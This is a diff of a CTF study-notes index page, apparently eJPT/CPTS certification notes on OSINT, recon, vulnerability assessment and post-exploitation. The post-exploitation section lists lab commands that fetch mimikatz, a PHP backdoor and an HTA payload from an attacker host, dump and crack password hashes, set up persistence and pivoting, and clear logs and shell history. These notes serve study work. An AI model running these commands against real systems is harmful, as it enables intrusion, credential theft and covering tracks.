@@ -250,6 +250,537 @@ if (!doNotTrack) {
         <div class="card-body">
             <div class="row">
                 <div class="col-md-10">
+                    <h3 class="fw-bold post-title">OSINT</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/guides/osint/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+                <h2 id="introduction">Introduction</h2>
+<h2 id="related-tools">Related Tools</h2>
+<ul>
+<li>Social Media
+<ul>
+<li>Sherlock <a href="https://github.com/sherlock-project/sherlock">GitHub</a>
+<ul>
+<li><code>python3 sherlock [username]</code></li>
+</ul>
+</li>
+<li>OSINT telegram bot <a href="https://t.me/UniversalSearchBot">https://t.me/UniversalSearchBot</a>
+<ul>
+<li>to search by: Email, Image, Phone, Location, Telegram ID, Domain, VK ID, IP Address</li>
+<li>To find: GAIA ID, Activity on google services (map reviews, calendar, google+, etc.), Instagram, Myspace, Leaks</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Reverse Search
+<ul>
+<li>Search engines (Using dorks) <a href="https://www.google.com">Google</a> <a href="https://www.bing.com/">Bing</a>
+<ul>
+<li>you can use any search engines of your choice</li>
+</ul>
+</li>
+<li>tineye, a reverse image search engine (<a href="https://tineye.com/">Website</a>)</li>
+<li><a href="https://images.google.com">Google Images</a>, <a href="https://lens.google.com">Google Lens</a></li>
+<li><a href="https://archive.org/">The Wayback Machine</a></li>
+</ul>
+</li>
+<li>Personal Details
+<ul>
+<li>epieos, osint tool for email and phone number (<a href="https://epieos.com/">Website</a>)</li>
+<li>theHarvester (<a href="https://www.kali.org/tools/theharvester/">Kali docs</a>) (<a href="https://github.com/laramies/theHarvester">github</a>)</li>
+<li>Guerillamail (create throwaway emails to send &amp; recieve) &lt;www.guerrillamail.com&gt; (as of 4 Jan, the website is unsecure)</li>
+</ul>
+</li>
+<li>Framework
+<ul>
+<li><a href="https://osintframework.com/">OSINT framework</a></li>
+<li><a href="https://shodan.io">Shodan</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="key-concepts">Key Concepts</h2>
+<ul>
+<li>when given USERNAME, run through sherlock/google to find websites where the username turns up. consider <code>inurl:</code></li>
+<li>when given EMAIL
+<ul>
+<li>consider sending an email to the address (with throwaway email) because there might be an automated reply (thanks josh)</li>
+<li>consider running it through a reverse email checker (I haven&rsquo;t found one that works) or obtaining the GAIA ID to check for google activity</li>
+</ul>
+</li>
+</ul>
+<h2 id="heading">.</h2>
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/guide/">guide</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Penetration Testing</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/guides/penetration-testing/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+                <h2 id="introduction">Introduction</h2>
+<h2 id="related-tools">Related tools</h2>
+<ul>
+<li>Nmap</li>
+<li>Metasploit</li>
+<li>Exploit Database <a href="https://www.exploit-db.com/">Website</a></li>
+<li>enum4linux, SMB share enumeration</li>
+</ul>
+<h2 id="key-concepts">Key concepts</h2>
+<ul>
+<li>Enumeration
+<ul>
+<li>Port scanning
+<ul>
+<li><code>nmap -sC -sV</code></li>
+</ul>
+</li>
+<li>SMB shares
+<ul>
+<li><code>smbclient -L target_ip</code></li>
+</ul>
+</li>
+<li>FTP server</li>
+<li>WinRM</li>
+</ul>
+</li>
+<li>Gaining access
+<ul>
+<li>Web shell</li>
+</ul>
+</li>
+<li>Privillege escalation
+<ul>
+<li>Restricted shell
+<ul>
+<li>Usually done with rbash</li>
+<li>Look for binaries you can execute and check its functionalities to see if you can take advantage of anything</li>
+</ul>
+</li>
+<li>Permission
+<ul>
+<li>Check binaries for SUID permission bit</li>
+</ul>
+</li>
+<li>Kernel explits</li>
+</ul>
+</li>
+</ul>
+<h2 id="heading">.</h2>
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/guide/">guide</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Pentesting Process</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/cert/cpts-pentesting-process/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+                <h2 id="stages-of-pentesting">Stages of pentesting</h2>
+<ul>
+<li>Pre-Engagement</li>
+<li>Information Gathering</li>
+<li>Vulnerability Assessment</li>
+<li>Exploitation/Post-Exploitation</li>
+<li>Lateral Movement</li>
+<li>Proof-of-Concept</li>
+</ul>
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/cpts/">cpts</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Post Exploitation</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/cert/ejpt-post-exploitation/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+                <h2 id="post-exploitation">Post-Exploitation</h2>
+<ul>
+<li>enumerating windows system information
+<ul>
+<li>scan <code>nmap -sV demo.ine.local</code></li>
+<li>searchsploit <code>searchsploit rejetto</code>, exploit with <code>use exploit/windows/http/rejetto_hfs_exec</code></li>
+<li>msf commands <code>sysinfo</code> <code>shell</code> <code>hostname</code> <code>systeminfo</code></li>
+<li>detailed info about windows hotfix <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code> when finding out exact windows version</li>
+</ul>
+</li>
+<li>enumerating windows users and groups
+<ul>
+<li>msf commands <code>getuid</code> <code>getprivs</code></li>
+<li>post exploit <code>background</code> <code>use post/windows/gather/enum_logged_on_users</code> <code>set SESSION 1</code></li>
+<li>check current permissions <code>whoami /priv</code></li>
+<li>check users <code>net users</code> <code>net user administrator</code></li>
+<li>check groups <code>net localgroup</code> <code>net localgroup administrators</code></li>
+</ul>
+</li>
+<li>enumerating windows network information
+<ul>
+<li>cmd commands <code>ipconfig</code> <code>ipconfig /all</code> <code>route print</code> <code>arp -a</code> <code>netstat -ano</code></li>
+</ul>
+</li>
+<li>enumerating processes and services
+<ul>
+<li>cmd commands <code>ps</code> <code>pgrep explorer.exe</code> <code>migrate 2252</code></li>
+<li>check services <code>net start</code>, details <code>wmic service list brief</code></li>
+<li>check tasks <code>tasklist /SVC</code> <code>schtasks /query /fo LIST</code></li>
+</ul>
+</li>
+<li>automating windows local enumeration
+<ul>
+<li>post exploit module for enum privs <code>use post/windows/gather/win_privs</code></li>
+<li>post exploit module for logged on users <code>use post/windows/gather/enum_logged_on_users</code></li>
+<li>post exploit check vm <code>use post/windows/gather/checkvm</code></li>
+<li>post exploit check apps <code>use post/windows/gather/enum_applications</code></li>
+<li>post exploit check computers <code>use post/windows/gather/enum_computers</code></li>
+<li>post exploit check patches <code>use post/windows/gather/enum_patches</code></li>
+<li>cool project <code>https://github.com/411Hall/JAWS</code>, upload with <code>upload /root/Desktop/jaws-enum.ps1</code></li>
+<li>execute file <code>powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt</code> download <code>download JAWS-Enum.txt</code></li>
+</ul>
+</li>
+<li>enumerating linux system information
+<ul>
+<li>commands <code>sysinfo</code> <code>hostname</code> <code>cat /etc/issue</code> <code>cat /etc/*release</code> <code>uname -a</code> <code>lscpu</code> <code>df -h</code></li>
+</ul>
+</li>
+<li>enumerating linux users and groups
+<ul>
+<li>check user groups information <code>getuid</code> <code>whoami</code> <code>groups root</code> <code>cat /etc/passwd</code> <code>groups</code> <code>who</code> <code>lastlog</code></li>
+</ul>
+</li>
+<li>enumerating linux network information
+<ul>
+<li>commands <code>ifconfig</code> <code>netstat</code> <code>route</code> <code>cat /etc/networks</code> <code>cat /etc/hosts</code> <code>cat /etc/resolv.conf</code></li>
+</ul>
+</li>
+<li>enumerating processes and cronjobs
+<ul>
+<li>commands <code>ps</code> <code>pgrep vsftpd</code> <code>ls -al /etc/cron*</code></li>
+</ul>
+</li>
+<li>automating linux local enumeration
+<ul>
+<li>use <code>background</code>, load modules</li>
+<li>check os info <code>use post/linux/gather/enum_configs</code></li>
+<li>check network <code>use post/linux/gather/enum_network</code></li>
+<li>check system config <code>use post/linux/gather/enum_system</code></li>
+<li>github <code>https://github.com/rebootuser/LinEnum</code></li>
+</ul>
+</li>
+<li>setting up a web server with python
+<ul>
+<li>command <code>python -m SimpleHTTPServer 80</code></li>
+</ul>
+</li>
+<li>transferring files with windows targets
+<ul>
+<li>use <code>python3 -m http.server 80</code> and <code>certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe</code></li>
+</ul>
+</li>
+<li>transferring files to linux targets
+<ul>
+<li>use <code>python3 -m http.server 80</code> and <code>wget http://192.217.117.2/php-backdoor.php</code></li>
+</ul>
+</li>
+<li>upgrading non-interactive shells
+<ul>
+<li>using bash interactive <code>/bin/bash -i</code></li>
+<li>using python <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+</ul>
+</li>
+<li>windows privesc check
+<ul>
+<li>check folder <code>cd C:\Users\student\Desktop\PrivescCheck</code></li>
+<li>run script <code>powershell -ep bypass -c &quot;. .\PrivescCheck.ps1; Invoke-PrivescCheck&quot;</code></li>
+<li>use the credentials <code>runas.exe /user:administrator cmd</code></li>
+<li>start an hta server <code>use exploit/windows/misc/hta_server</code> and execute payload <code>mshta.exe http://10.10.31.2:8080/Rv4eiCTge85UJ15.hta</code></li>
+</ul>
+</li>
+<li>permissions matter!
+<ul>
+<li>check for writable files <code>find / -not -type l -perm -o+w</code></li>
+<li>create password for root user <code>openssl passwd -1 -salt abc password</code> and add the generated entry <code>vim /etc/shadow</code></li>
+</ul>
+</li>
+<li>editing gone wrong
+<ul>
+<li>check suid binaries <code>find / -user root -perm -4000 -exec ls -ldb {} \;</code></li>
+<li>check sudo commands <code>sudo -l</code></li>
+<li>launch man and get shell <code>sudo man ls</code> <code>!/bin/bash</code></li>
+</ul>
+</li>
+<li>maintaining access, persistence service
+<ul>
+<li>use module <code>use exploit/windows/local/persistence_service</code> to get a new session whenever victim reboots</li>
+</ul>
+</li>
+<li>maintaining access, rdp
+<ul>
+<li>migrate to gain privilege <code>getuid</code> <code>ps -S explorer.exe</code> <code>migrate 2764</code></li>
+<li>msf meterpreter <code>run getgui -e -u alice -p hack_123321</code> and login with <code>xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local</code></li>
+</ul>
+</li>
+<li>maintaining access I
+<ul>
+<li>copy the ssh private key <code>scp student@demo.ine.local:~/.ssh/id_rsa .</code></li>
+<li>login with private key <code>chmod 400 id_rsa</code> <code>ssh -i id_rsa student@demo.ine.local</code></li>
+</ul>
+</li>
+<li>local job scheduling
+<ul>
+<li>create cronjob for http server <code>echo &quot;* * * * * cd /home/student/ &amp;&amp; python -m SimpleHTTPServer&quot; &gt; cron</code> <code>crontab -i cron</code> <code>crontab -l</code></li>
+</ul>
+</li>
+<li>windows ntlm hash cracking
+<ul>
+<li>migrate to lsass.exe <code>migrate -N lsass.exe</code></li>
+<li>dump the hashes <code>hashdump</code></li>
+<li>check hashes are stored <code>background</code> <code>creds</code></li>
+<li>crack hashes <code>use auxiliary/analyze/crack_windows</code> <code>set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt</code></li>
+</ul>
+</li>
+<li>linux password cracker
+<ul>
+<li>start the database <code>/etc/init.d/postgresql start</code></li>
+<li>linux hashdump <code>use post/linux/gather/hashdump</code></li>
+<li>crack hash <code>use auxiliary/analyze/crack_linux</code> <code>set SHA512 true</code></li>
+</ul>
+</li>
+<li>pivoting
+<ul>
+<li>use <code>ipconfig</code> to check the ip of next machine then use <code>run autoroute -s 10.0.16.0/20</code></li>
+<li>now we can scan using <code>use auxiliary/scanner/portscan/tcp</code></li>
+<li>do port forwarding <code>portfwd add -l 1234 -p 80 -r demo2.ine.local</code></li>
+</ul>
+</li>
+<li>clearing your own tracks on windows
+<ul>
+<li>clear event logs <code>clearev</code></li>
+</ul>
+</li>
+<li>clearing your own tracks on linux
+<ul>
+<li>clear history <code>history -c</code></li>
+<li>clear bash history file <code>cat /dev/null &gt; ~/.bash_history</code></li>
+</ul>
+</li>
+</ul>
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/ejpt/">ejpt</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
                     <h3 class="fw-bold post-title">Reverse Engineering</h3>
                 </div>
                 <div class="col-md-2 d-flex justify-content-end">
@@ -337,6 +868,107 @@ if (!doNotTrack) {
             <div class="blog-tags">
                 
                 <a href="https://ctf-journey.github.io/tags/guide/">guide</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Vuln Assessment</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/cert/cpts-vuln-assessment/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+                <h2 id="security-assessments">security assessments</h2>
+<ul>
+<li>security assessments</li>
+<li>vulnerability assessment</li>
+<li>assessment standards</li>
+</ul>
+<h2 id="vulnerability-scoring-and-reporting">vulnerability scoring and reporting</h2>
+<ul>
+<li>common vulnerability scoring system (CVSS)</li>
+<li>common vulnerability and exposures (CVE)</li>
+</ul>
+<h2 id="nessus">nessus</h2>
+<ul>
+<li>vulnerability scanning overview</li>
+<li>getting started with nessus</li>
+<li>nessus scan</li>
+<li>advaced settings</li>
+<li>working with nessus scan output</li>
+<li>scanning issues</li>
+<li>nessus skills assessment</li>
+</ul>
+<h2 id="openvas">openvas</h2>
+<ul>
+<li>getting started with openvas</li>
+<li>openvas scan</li>
+<li>exporting the results</li>
+<li>openvas skills assessment</li>
+</ul>
+<h2 id="reporting">reporting</h2>
+<ul>
+<li>reporting
+<ul>
+<li>executive summary</li>
+<li>overview of assessment</li>
+<li>scope</li>
+<li>vulnerability and recommendations</li>
+</ul>
+</li>
+</ul>
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/cpts/">cpts</a>
                 
             </div>
         </div>
@@ -597,6 +1229,155 @@ if (!doNotTrack) {
         <div class="card-body">
             <div class="row">
                 <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Web Info Gathering</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/cert/cpts-web-info-gathering/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+                <h2 id="whois">whois</h2>
+<ul>
+<li>whois</li>
+</ul>
+<h2 id="dns">dns</h2>
+<ul>
+<li>digging dns
+<ul>
+<li><code>dig &lt;ip&gt; &lt;type&gt;</code></li>
+</ul>
+</li>
+<li>subdomain bruteforcing
+<ul>
+<li>dnsenum <code>dnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt </code></li>
+</ul>
+</li>
+<li>dns zone transfers
+<ul>
+<li>zone transfer domain <code>dig axfr @nsztm1.digi.ninja zonetransfer.me</code></li>
+<li>zone transfer ip <code>dig axfr inlanefreight.htb @10.129.63.9</code></li>
+</ul>
+</li>
+<li>virtual hosts
+<ul>
+<li>multiple application, same ip</li>
+<li>vhost fuzzing or hosts file to discover non-public subdomains</li>
+<li>types of vhost include <code>name-based</code> (using http header), <code>ip based</code>, <code>port based</code></li>
+<li>tools include <code>gobuster</code>, <code>Feroxbuster</code>, <code>ffuf</code></li>
+<li>gobuster <code>sudo gobuster vhost -u http://inlanefreight.htb:55676/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --append-domain</code></li>
+<li>PLEASE add the IP into <code>sudo nano /etc/hosts</code> first!</li>
+</ul>
+</li>
+<li>ct logs
+<ul>
+<li>ct logs <code>curl -s &quot;https://crt.sh/?q=%25.example.com&amp;output=json&quot; | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="fingerprinting">fingerprinting</h2>
+<ul>
+<li>fingerprinting
+<ul>
+<li>waf <code>pip3 install git+https://github.com/EnableSecurity/wafw00f</code>, <code>wafw00f inlanefreight.com</code></li>
+<li>nikto scanner <code>sudo apt update &amp;&amp; sudo apt install -y perl</code>, <code>git clone https://github.com/sullo/nikto</code>, <code>cd nikto/program</code>, <code>chmod +x ./nikto.pl</code></li>
+<li>nikto usage <code>nikto -h inlanefreight.com -Tuning b</code></li>
+<li>PLEASE add the IP into <code>sudo nano /etc/hosts</code> first! (including subdomains)</li>
+</ul>
+</li>
+</ul>
+<h2 id="crawling">crawling</h2>
+<ul>
+<li>crawling</li>
+<li>robots.txt</li>
+<li>.well-known uris</li>
+<li>creepy crawlies
+<ul>
+<li>scrapy <code>pip3 install scrapy</code></li>
+<li>scrapy spider ReconSpider <code>wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip</code></li>
+<li>usage <code>python3 ReconSpider.py http://inlanefreight.com</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="search-engine-discovery">search engine discovery</h2>
+<ul>
+<li>search engine discovery</li>
+</ul>
+<h2 id="web-archives">web archives</h2>
+<ul>
+<li>web archives
+<ul>
+<li>wayback machine</li>
+</ul>
+</li>
+</ul>
+<h2 id="automating-recon">automating recon</h2>
+<ul>
+<li>automating recon</li>
+</ul>
+<h2 id="skills-assessment">skills assessment</h2>
+<ul>
+<li>test
+<ul>
+<li><code>sudo sh -c 'echo &quot;94.237.61.84 inlanefreight.htb&quot; &gt;&gt; /etc/hosts'</code></li>
+<li>fuzz <code>ffuf -u http://web1337.inlanefreight.htb:46881/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -e .html -v</code></li>
+</ul>
+</li>
+</ul>
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/cpts/">cpts</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
                     <h3 class="fw-bold post-title">Web Pentest</h3>
                 </div>
                 <div class="col-md-2 d-flex justify-content-end">
@@ -768,80 +1549,6 @@ if (!doNotTrack) {
     </div>
 </div>
     
-    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
-    
-        <div class="card border mb-3 "> 
-        <div class="card-body">
-            <div class="row">
-                <div class="col-md-10">
-                    <h3 class="fw-bold post-title">Zeogen Generator</h3>
-                </div>
-                <div class="col-md-2 d-flex justify-content-end">
-                    <a href="https://ctf-journey.github.io/notes/backup/decompile-zeogen-generator/">
-                        <button type="button" class="btn btn-outline-dark">
-                            Link
-                        </button>
-                    </a>
-                </div>
-            </div>
-
-            
-
-            <p class="post-meta">
-                <span class="post-meta text-muted">
-  
-  
-
-  January 1, 0001
-
-  
-
-  
-
-  
-
-  
-</span>
-
-            </p>
-            
-            <div class="post-entry">
-
-                
-                <h2 id="source-of-executable">Source of executable</h2>
-<ul>
-<li>Guy send me this EXE file on Discord</li>
-<li>Executable was a supposed Amazon Storecard generator</li>
-</ul>
-<h2 id="reversing-steps">Reversing steps</h2>
-<ul>
-<li>Using <code>strings</code>, we can identify PyInstaller was used to convert the PY script to EXE</li>
-<li>Using <code>PyInstxtractor</code>, we can decompile it into the python bytecode files</li>
-<li>Using <code>pycadas</code>, we can decompile python bytecode files into readable instructions!</li>
-<li>Tool appears to be just a RNG and generating fake card details</li>
-<li>The file &ldquo;zeogen.pyc&rdquo; stood out, a quick Google search shows its on GitHub!</li>
-<li>Comparing the sources, seems like it has been rebranded and sold multiple times</li>
-</ul>
-<h2 id="conclusion">Conclusion</h2>
-<ul>
-<li>Don&rsquo;t buy stupid scripts LOL</li>
-<li>Open source is used by scammers too!</li>
-</ul>
-<p>.</p>
-
-                
-            </div>
-        </div>
-        
-        
-        
-
-
-
-
-    </div>
-</div>
-    
 
   </div>
 </div>
@@ -871,11 +1578,14 @@ if (!doNotTrack) {
       <li class="page-item active">
         <a aria-current="page" aria-label="Page 4" class="page-link" role="button">4</a>
       </li>
-      <li class="page-item disabled">
-        <a aria-disabled="true" aria-label="Next" class="page-link" role="button" tabindex="-1"><span aria-hidden="true">&raquo;</span></a>
+      <li class="page-item">
+        <a href="/notes/page/5/" aria-label="Page 5" class="page-link" role="button">5</a>
       </li>
-      <li class="page-item disabled">
-        <a aria-disabled="true" aria-label="Last" class="page-link" role="button" tabindex="-1"><span aria-hidden="true">&raquo;&raquo;</span></a>
+      <li class="page-item">
+        <a href="/notes/page/5/" aria-label="Next" class="page-link" role="button"><span aria-hidden="true">&raquo;</span></a>
+      </li>
+      <li class="page-item">
+        <a href="/notes/page/5/" aria-label="Last" class="page-link" role="button"><span aria-hidden="true">&raquo;&raquo;</span></a>
       </li>
     </ul>
         </ul>
